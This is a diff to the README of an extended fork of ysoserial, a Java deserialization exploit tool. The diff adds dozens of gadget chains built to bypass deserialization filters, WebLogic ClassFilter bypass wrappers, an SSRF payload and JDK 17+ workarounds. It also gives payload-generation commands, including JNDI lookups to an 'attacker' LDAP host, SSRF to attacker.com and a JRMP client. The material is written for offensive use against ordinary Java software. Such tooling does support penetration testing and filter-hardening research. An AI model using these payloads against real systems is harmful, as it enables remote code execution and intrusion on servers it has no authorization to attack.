@@ -1,7 +1,7 @@
 
 # ysoserial (extended)
 
-Fork of [frohoff/ysoserial](https://github.com/frohoff/ysoserial) with **35+ additional gadget chains** from academic papers (JDD, FLASH, GCMiner), independent research, and automated fuzzer discovery. Focuses on filter-bypass entry points, cross-library evasion, and JDK 17+ compatible sinks.
+Fork of [frohoff/ysoserial](https://github.com/frohoff/ysoserial) with **50+ additional gadget chains** from academic papers (JDD, FLASH, GCMiner), independent research, IOCD static analysis, and automated fuzzer discovery. Focuses on filter-bypass entry points, cross-library evasion, non-RCE impact primitives, and JDK 17+ compatible sinks.
 
 A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
 
@@ -18,6 +18,12 @@ Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically
 | `ConcurrentHashMap` | CC10, CC11, ROME4, Hibernate3, ROMEJndi | Rarely blocked — used extensively in JDK internals |
 | `ConcurrentSkipListMap` | CC16 ‡, CB5 ‡, CBJndi3 ‡ | Never blocked — first use as deser entry point |
 | `PriorityBlockingQueue` | CC17 ‡, CB6 ‡, CBJndi4 ‡ | Concurrent variant of PriorityQueue — filters check PQ by exact class name |
+| `DualHashBidiMap` | CC18 ‡, CC22 ‡, CCJndi3 ‡, CCSSRF ‡, ROME6 ‡, Hibernate4 ‡ | BidiMap family — never in any filter list |
+| `DualTreeBidiMap` | CC21 ‡, CB7 ‡, CBJndi5 ‡ | BidiMap with TreeMap internals — Comparator dispatch |
+| `ListOrderedMap` | CC19 ‡, CC23 ‡ | Decorator pattern — wraps HashMap, different class identity |
+| `PassiveExpiringMap` | CC20 ‡ | CC4-only decorator — never filtered |
+| `HashBag` | CC24 ‡, CC25 ‡ | Bag type entry — not Map/Set/Queue, completely novel class family |
+| `CaseInsensitiveMap` | CC26 ‡, CC27 ‡ | **toString dispatch** — novel mechanism, not hashCode/compare |
 | `TreeBag` | CB3 | CC4-specific class, not in standard filter lists |
 | `LinkedHashSet` | CC12, CC13 †, CC15 | Extends HashSet but class-level filters often miss it |
 | `TreeSet` | Click2, BeanShell2 | Standard JDK class, never blocked in known filters |
@@ -52,6 +58,8 @@ These chains work without `--add-opens java.xml` by using JNDI sinks instead of 
 | `CommonsBeanutils4` | `JdbcRowSetImpl` → JNDI | CB + PriorityQueue + JNDI sink |
 | `CommonsBeanutilsJndi3` ‡ | `JdbcRowSetImpl` → JNDI | CB + ConcurrentSkipListMap — novel entry, no CC needed |
 | `CommonsBeanutilsJndi4` ‡ | `JdbcRowSetImpl` → JNDI | CB + PriorityBlockingQueue — PQ filter bypass, no CC needed |
+| `CommonsBeanutilsJndi5` ‡ | `JdbcRowSetImpl` → JNDI | CB + DualTreeBidiMap — BidiMap entry, no CC needed |
+| `CommonsCollectionsJndi3` ‡ | `InitialContext.doLookup()` | DualHashBidiMap entry — BidiMap filter bypass |
 | `ROMEJndi2` ‡ | PBQ + `StringValueTransformer` → JNDI | No InvokerTransformer, no HashMap — novel bridge |
 | `CommonsBeanutilsH2` | `JdbcRowSetImpl` → H2 JDBC INIT | RCE via H2 SQL (requires H2 1.x on target) |
 | `WildFly1` | `InitialContext.lookup()` | Direct JNDI from `readObject()` — 120 bytes |
@@ -64,6 +72,61 @@ Native Java deserialization chains using jackson-databind (one of the most commo
 |-------|-----------|------|-------------|
 | `Jackson1` | @Y4tacker, @mbechler | `TemplatesImpl` bytecode | `BadAttributeValueExpException` → `POJONode.toString()` → getter invocation → RCE |
 | `Jackson2` | @Y4tacker, @mbechler | `JdbcRowSetImpl` JNDI | Same trigger, JNDI sink — JDK 17+ friendly |
+
+### IOCD-Discovered Chains (Static Analysis + Fuzzer)
+
+Discovered via **IOCD static analysis** (bytecode scanning for source→link→sink paths) combined with differential fuzzing. These exploit novel entry points from commons-collections' internal Map/Bag/BidiMap classes:
+
+| Chain | Entry Class | Dispatch | Sink | Library |
+|-------|------------|----------|------|---------|
+| `CC18` ‡ | `DualHashBidiMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC3 |
+| `CC19` ‡ | `ListOrderedMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC3 |
+| `CC20` ‡ | `PassiveExpiringMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC4 |
+| `CC21` ‡ | `DualTreeBidiMap` | compare | InstantiateTransformer → `TemplatesImpl` | CC4 |
+| `CC22` ‡ | `DualHashBidiMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC4 |
+| `CC23` ‡ | `ListOrderedMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC4 |
+| `CC24` ‡ | `HashBag` | hashCode | InvokerTransformer → `Runtime.exec()` | CC3 |
+| `CC25` ‡ | `HashBag` | hashCode | InvokerTransformer → `Runtime.exec()` | CC4 |
+| `CC26` ‡ | `CaseInsensitiveMap` | **toString** | InvokerTransformer → `Runtime.exec()` | CC3 |
+| `CC27` ‡ | `CaseInsensitiveMap` | **toString** | InvokerTransformer → `Runtime.exec()` | CC4 |
+| `CB7` ‡ | `DualTreeBidiMap` | compare | BeanComparator → `TemplatesImpl` | CB |
+| `CBJndi5` ‡ | `DualTreeBidiMap` | compare | BeanComparator → JNDI | CB |
+| `CCJndi3` ‡ | `DualHashBidiMap` | hashCode | ChainedTransformer → `doLookup()` | CC3 |
+
+**CC26/CC27** are particularly notable: they use `toString()` dispatch via `CaseInsensitiveMap.convertKey()` — a novel dispatch mechanism distinct from `hashCode()`, `compare()`, or `equals()`.
+
+### Cross-Family Chains
+
+These combine gadgets from different libraries in a single chain:
+
+| Chain | Entry | Bridge | Sink | Libraries |
+|-------|-------|--------|------|-----------|
+| `CC13` † | `LinkedHashSet` | CC4 `TiedMapEntry` + CC3 `LazyMap` | InvokerTransformer | CC3 + CC4 |
+| `CCJndi2` † | `LinkedHashSet` | CC4 `TiedMapEntry` + CC3 `LazyMap` | `doLookup()` | CC3 + CC4 |
+| `ROME6` ‡ | `DualHashBidiMap` | CC3 `TiedMapEntry` + ROME `ObjectBean` | `TemplatesImpl` | CC3 + ROME |
+| `Hibernate4` ‡ | `DualHashBidiMap` | CC3 `TiedMapEntry` + Hibernate `TypedValue` | `TemplatesImpl` | CC3 + Hibernate |
+
+### Non-RCE Impact Primitives
+
+Not all deserialization = RCE. These demonstrate alternative impact classes:
+
+| Chain | Impact | Description |
+|-------|--------|-------------|
+| `CommonsCollectionsSSRF` ‡ | **SSRF** | DualHashBidiMap → `URL.openStream()` — server-side HTTP GET to attacker-controlled URL |
+| `URLDNS` | DNS lookup | Classic DNS-only chain (no RCE, useful for detection) |
+
+`CommonsCollectionsSSRF` is the **first non-RCE ysoserial payload** — demonstrates that blocking `Runtime.exec` and JNDI is insufficient if `URL.openStream()` remains accessible.
+
+### WebLogic Filter Bypass Wrappers
+
+Bypass WebLogic's `ClassFilter` by wrapping an inner payload in a second-stage deserialization:
+
+| Chain | Mechanism | Description |
+|-------|-----------|-------------|
+| `WebLogic1` | `MarshalledObject.readResolve()` | Wraps inner payload — ClassFilter only checks outer layer |
+| `WebLogic2` | `StreamMessageImpl.readExternal()` | JMS message wrapper — version=1 path triggers nested deser |
+
+Usage: `java -jar ysoserial.jar WebLogic1 CommonsCollections6:'calc.exe' > payload.bin`
 
 ### JDK-Only Chains (No Library Dependencies)
 
@@ -99,18 +162,27 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `CommonsCollections14` | @zema1 | CC6 trigger + InstantiateTransformer sink — InvokerTransformer filter bypass |
 | `CommonsCollections15` | @zema1, @su18 | LinkedHashSet + InstantiateTransformer — double evasion (root + sink) |
 | `CommonsCollections16` | @dmbs335 ‡ | ConcurrentSkipListMap + InstantiateTransformer — novel entry point, 5x filter bypass |
+| `CommonsCollections18`–`27` | @dmbs335 ‡ | 10 IOCD-discovered chains — see [IOCD section](#iocd-discovered-chains-static-analysis--fuzzer) |
 | `CommonsBeanutils5` | @dmbs335 ‡ | ConcurrentSkipListMap + BeanComparator — no CC dependency on target |
+| `CommonsBeanutils7` | @dmbs335 ‡ | DualTreeBidiMap + BeanComparator → TemplatesImpl — BidiMap entry |
 | `CommonsBeanutilsJndi3` | @dmbs335 ‡ | ConcurrentSkipListMap + JNDI — JDK 17+ friendly, no CC, no TemplatesImpl |
+| `CommonsBeanutilsJndi5` | @dmbs335 ‡ | DualTreeBidiMap + BeanComparator → JNDI — BidiMap entry, no CC |
 | `CommonsCollections17` | @dmbs335 ‡ | PriorityBlockingQueue + InstantiateTransformer — PQ filter bypass + sink bypass |
 | `CommonsBeanutils6` | @dmbs335 ‡ | PriorityBlockingQueue + BeanComparator — no CC dependency on target |
 | `CommonsBeanutilsJndi4` | @dmbs335 ‡ | PriorityBlockingQueue + JNDI — JDK 17+, no TemplatesImpl, no CC |
+| `CommonsCollectionsJndi3` | @dmbs335 ‡ | DualHashBidiMap + JNDI — BidiMap filter bypass |
+| `CommonsCollectionsSSRF` | @dmbs335 ‡ | DualHashBidiMap → URL.openStream() — **first non-RCE SSRF payload** |
 | `Groovy2` | @dmbs335 ‡ | BAVE + ConvertedClosure(toString) — no HashMap, no AIH, no TemplatesImpl, no CC |
 | `ROME5` | @dmbs335 ‡ | PBQ + StringValueTransformer → ToStringBean — novel toString bridge, no InvokerTransformer |
+| `ROME6` | @dmbs335 ‡ | DualHashBidiMap + ROME ObjectBean → TemplatesImpl — cross-family (CC3+ROME) |
 | `ROMEJndi2` | @dmbs335 ‡ | PBQ + StringValueTransformer → JNDI — JDK 17+, no InvokerTransformer, no HashMap |
+| `Hibernate4` | @dmbs335 ‡ | DualHashBidiMap + Hibernate TypedValue → TemplatesImpl — cross-family (CC3+Hibernate) |
+| `WebLogic1` | @dmbs335 | MarshalledObject wrapper — bypasses WebLogic ClassFilter |
+| `WebLogic2` | @dmbs335 | StreamMessageImpl wrapper — bypasses WebLogic ClassFilter |
 
 > **†** Discovered by @dmbs335 via automated fuzzing ([web-fuzzer](https://github.com/dmbs335/web-fuzzer), 2026-03-14). CC13 (cross-library CC4+CC3) and CCJndi2 (cross-library JNDI) are novel chains found by type-aware mutation and cross-library chain splicing.
 >
-> **‡** Discovered by @dmbs335 with Claude Code (2026-03-14). Novel entry points: CC16/CB5/CBJndi3 use `ConcurrentSkipListMap`, CC17/CB6/CBJndi4 use `PriorityBlockingQueue` — `java.util.concurrent` classes never in any filter blocklist. Novel bridge: ROME5/ROMEJndi2 use `StringValueTransformer` (toString bridge) — a CC4 transformer never seen in any gadget chain, connecting PBQ entry to ROME's ToStringBean without InvokerTransformer. Novel trigger: Groovy2 uses `BadAttributeValueExpException` → `ConvertedClosure("toString")` — completely different entry/trigger/sink from Groovy1.
+> **‡** Discovered by @dmbs335 with Claude Code (2026-03-14). Includes: (1) **IOCD static analysis** — ASM bytecode scanning discovers source→link→sink paths, producing CC18–27 with novel entry classes (DualHashBidiMap, ListOrderedMap, HashBag, CaseInsensitiveMap); (2) **Novel entry points** — CC16/CB5/CBJndi3 (`ConcurrentSkipListMap`), CC17/CB6/CBJndi4 (`PriorityBlockingQueue`); (3) **Novel dispatch** — CC26/CC27 use `toString()` via `CaseInsensitiveMap.convertKey()`; (4) **Cross-family** — ROME6, Hibernate4 combine CC3 entry with different library sinks; (5) **Non-RCE** — CommonsCollectionsSSRF demonstrates SSRF impact without code execution; (6) **Novel bridge** — ROME5/ROMEJndi2 use `StringValueTransformer` (toString bridge).
 
 ### Exploit Tools
 
@@ -119,7 +191,7 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `JRMPListener` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.JRMPListener <port> <payload> <cmd>` |
 | `RMIRegistryExploit` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <host> <port> <payload> <cmd>` |
 
-## All Payloads (82 total)
+## All Payloads (100 total)
 
 ```
 Payload                Authors                                Dependencies
@@ -141,11 +213,13 @@ CommonsBeanutils3      @su18                                  commons-beanutils:
 CommonsBeanutils4      @su18                                  commons-beanutils:1.9.2, commons-collections:3.1
 CommonsBeanutils5      @dmbs335 ‡                             commons-beanutils:1.9.2
 CommonsBeanutils6      @dmbs335 ‡                             commons-beanutils:1.9.2
+CommonsBeanutils7      @dmbs335 ‡                             commons-beanutils:1.9.2
 CommonsBeanutilsH2     @hmunch                                commons-beanutils:1.9.2
 CommonsBeanutilsJndi   @frohoff                               commons-beanutils:1.9.2
 CommonsBeanutilsJndi2  @su18                                  commons-beanutils:1.9.2, commons-collections4:4.0
 CommonsBeanutilsJndi3  @dmbs335 ‡                             commons-beanutils:1.9.2
 CommonsBeanutilsJndi4  @dmbs335 ‡                             commons-beanutils:1.9.2
+CommonsBeanutilsJndi5  @dmbs335 ‡                             commons-beanutils:1.9.2
 CommonsCollections1    @frohoff                               commons-collections:3.1
 CommonsCollections2    @frohoff                               commons-collections4:4.0
 CommonsCollections3    @frohoff                               commons-collections:3.1
@@ -163,8 +237,20 @@ CommonsCollections14   @zema1                                 commons-collection
 CommonsCollections15   @zema1, @su18                          commons-collections:3.1
 CommonsCollections16   @dmbs335 ‡                             commons-collections4:4.0
 CommonsCollections17   @dmbs335 ‡                             commons-collections4:4.0
+CommonsCollections18   @dmbs335 ‡                             commons-collections:3.1
+CommonsCollections19   @dmbs335 ‡                             commons-collections:3.1
+CommonsCollections20   @dmbs335 ‡                             commons-collections4:4.0
+CommonsCollections21   @dmbs335 ‡                             commons-collections4:4.0
+CommonsCollections22   @dmbs335 ‡                             commons-collections4:4.0
+CommonsCollections23   @dmbs335 ‡                             commons-collections4:4.0
+CommonsCollections24   @dmbs335 ‡                             commons-collections:3.1
+CommonsCollections25   @dmbs335 ‡                             commons-collections4:4.0
+CommonsCollections26   @dmbs335 ‡                             commons-collections:3.1
+CommonsCollections27   @dmbs335 ‡                             commons-collections4:4.0
 CommonsCollectionsJndi @mbechler                              commons-collections:3.1
 CommonsCollectionsJndi2 @dmbs335 †                            commons-collections:3.1, commons-collections4:4.0
+CommonsCollectionsJndi3 @dmbs335 ‡                            commons-collections:3.1
+CommonsCollectionsSSRF @dmbs335 ‡                             commons-collections:3.1
 FileUpload1            @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
 Groovy1                @frohoff                               groovy:2.3.9
 Groovy2                @dmbs335 ‡                             groovy:2.3.9
@@ -172,6 +258,7 @@ GroovyGStr             @frohoff                               groovy:2.4.3
 Hibernate1             @mbechler                              hibernate-core:4.3.11.Final
 Hibernate2             @mbechler                              hibernate-core:4.3.11.Final
 Hibernate3             @mbechler                              hibernate-core:4.3.11.Final
+Hibernate4             @dmbs335 ‡                             hibernate-core:4.3.11.Final
 HibernateCK            @mbechler, @hugo-syn                   hibernate-core:4.3.11.Final
 Jackson1               @Y4tacker, @mbechler                   jackson-databind:2.12.7.1
 Jackson2               @Y4tacker, @mbechler                   jackson-databind:2.12.7.1
@@ -192,6 +279,7 @@ ROME2                  @mbechler                              rome:1.0
 ROME3                  @mbechler                              rome:1.0
 ROME4                  @mbechler                              rome:1.0
 ROME5                  @dmbs335 ‡                             commons-collections4:4.0, rome:1.0
+ROME6                  @dmbs335 ‡                             rome:1.0, commons-collections:3.1
 ROMEJndi               @mbechler                              rome:1.0
 ROMEJndi2              @dmbs335 ‡                             commons-collections4:4.0, rome:1.0
 Scala                  @mbechler                              scala-library:2.12.6
@@ -203,6 +291,8 @@ Struts2JasperReports   @sciccone                              struts2-core:2.5.2
 URLDNS                 @gebl
 Vaadin1                @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
 VaadinMP               @kullrich                              vaadin-server:7.7.14, vaadin-shared:7.7.14
+WebLogic1              @dmbs335                               (weblogic.jar runtime)
+WebLogic2              @dmbs335                               (weblogic.jar runtime)
 Wicket1                @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
 WildFly1               @hugo-syn                              wildfly-connector:26.0.1.Final
 ```
@@ -283,6 +373,21 @@ java -jar ysoserial.jar Groovy2 'calc.exe' > payload.bin
 java -jar ysoserial.jar ROME5 'calc.exe' > payload.bin
 java -jar ysoserial.jar ROMEJndi2 'ldap://attacker:1389/Exploit' > payload.bin
 
+# IOCD-discovered: DualHashBidiMap entry — never in any filter
+java -jar ysoserial.jar CommonsCollections18 'calc.exe' > payload.bin
+
+# IOCD-discovered: toString dispatch via CaseInsensitiveMap (novel mechanism)
+java -jar ysoserial.jar CommonsCollections26 'calc.exe' > payload.bin
+
+# Cross-family: CC3 entry + ROME sink
+java -jar ysoserial.jar ROME6 'calc.exe' > payload.bin
+
+# SSRF (non-RCE): server-side HTTP GET to attacker URL
+java -jar ysoserial.jar CommonsCollectionsSSRF 'http://attacker.com/ssrf' > payload.bin
+
+# WebLogic filter bypass: wraps inner payload
+java -jar ysoserial.jar WebLogic1 "CommonsCollections6:'calc.exe'" > payload.bin
+
 # Nested wrapper to bypass first-layer type filters
 java -jar ysoserial.jar SignedObjectWrap 'calc.exe' > payload.bin
 
@@ -291,7 +396,11 @@ java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 '
 java -jar ysoserial.jar JRMPClient 'attacker:1099' > payload.bin
 ```
 
-### JDK 17+ Note
+### JDK 17+ Compatibility
+
+**Fixed in this fork**: 6 payloads that broke on JDK 17+ due to `BadAttributeValueExpException.val` field type change (`Object` → `String`) now use `Unsafe.putObject()` to bypass the type check: **CC5, CC9, Jackson1, Jackson2, MozillaRhino1, Vaadin1**.
+
+Jackson1/Jackson2 also handle the `BaseJsonNode.writeReplace()` defense backported to jackson-databind 2.12.7.1 by clearing the `writeReplaceMethod` field in `ObjectStreamClass` via Unsafe.
 
 On JDK 17+, payloads using `TemplatesImpl` require module opens at **generation time**:
 
@@ -299,10 +408,16 @@ On JDK 17+, payloads using `TemplatesImpl` require module opens at **generation 
 java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
      --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
      --add-opens java.base/java.util=ALL-UNNAMED \
+     --add-opens java.base/java.lang=ALL-UNNAMED \
      -jar ysoserial.jar ROME 'calc.exe' > payload.bin
 ```
 
-JNDI-based payloads (`CommonsCollectionsJndi`, `Jackson2`, `ROMEJndi`, `WildFly1`) do **not** need these flags.
+Additional opens for specific payloads:
+- Jackson1/2: `--add-opens java.management/javax.management=ALL-UNNAMED`
+- CB6/CBJndi4/CC17 (PBQ): `--add-opens java.base/java.util.concurrent=ALL-UNNAMED`
+- ROMEJndi/Jackson2/CBJndi*: `--add-opens java.sql.rowset/com.sun.rowset=ALL-UNNAMED`
+
+JNDI-based payloads (`CommonsCollectionsJndi`, `Jackson2`, `ROMEJndi`, `WildFly1`) do **not** need TemplatesImpl opens.
 
 ## Examples
 
